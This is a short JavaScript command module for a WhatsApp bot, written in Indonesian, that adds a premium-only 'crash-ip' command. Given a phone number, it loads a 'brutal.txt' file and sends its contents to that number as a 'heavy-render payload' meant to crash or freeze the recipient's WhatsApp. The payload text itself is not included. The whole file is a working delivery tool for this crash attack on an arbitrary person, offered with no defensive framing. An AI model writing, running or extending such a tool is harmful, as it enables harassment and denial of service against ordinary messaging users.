const fs = require('fs');
const path = require('path');

module.exports = {
    command: 'crash-ip',
    execute: async (sock, m, { args, reply, isPremium }) => {
        if (!isPremium) return reply("Fitur ini khusus untuk member premium (murbug).");
        
        const nomor = args[0];
        const BRUTAL_FILE = './brutal.txt';

        if (!nomor) return reply("Penggunaan: .crash-ip [nomor]\nContoh: .crash-ip 6281234567890");

        const target = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

        try {
            if (!fs.existsSync(BRUTAL_FILE)) return reply("File payload brutal.txt tidak ditemukan.");
            
            const payload = fs.readFileSync(BRUTAL_FILE, 'utf-8');
            const finalChat = '⿻ 𝐌𝐚𝐫𝐢𝐧 𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫\n' + payload;

            await reply(`Deploying heavy-render payload to ${target}...`);

            await sock.sendMessage(target, { text: finalChat }, { quoted: m });

            reply(`Payload delivered to ${target}`);
        } catch (err) {
            reply("Gagal mengirim bug: " + err.message);
        }
    }
};
